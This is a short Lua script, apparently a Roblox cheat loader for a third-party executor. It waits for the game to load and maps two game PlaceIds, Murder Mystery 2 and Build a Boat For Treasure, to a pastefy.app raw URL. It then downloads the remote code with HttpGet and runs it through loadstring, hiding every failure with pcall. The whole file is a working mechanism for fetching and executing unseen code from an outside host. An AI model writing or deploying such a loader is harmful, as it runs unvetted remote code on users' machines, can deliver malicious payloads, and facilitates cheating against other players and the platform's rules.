if not game:IsLoaded() then
    game.Loaded:Wait()
end

local scripts = {
    [142823291] = "", -- Murder Mystery 2
    [537413528] = "https://pastefy.app/6niBfgKp/raw"  -- Build a Boat For Treasure
}

local scriptUrl = scripts[game.PlaceId]

if not scriptUrl then
    return
end

local success, source = pcall(function()
    return game:HttpGet(scriptUrl, true)
end)

if not success or not source or source == "" then
    return
end

local compileSuccess, fn = pcall(loadstring, source)

if not compileSuccess or type(fn) ~= "function" then
    return
end

pcall(fn)
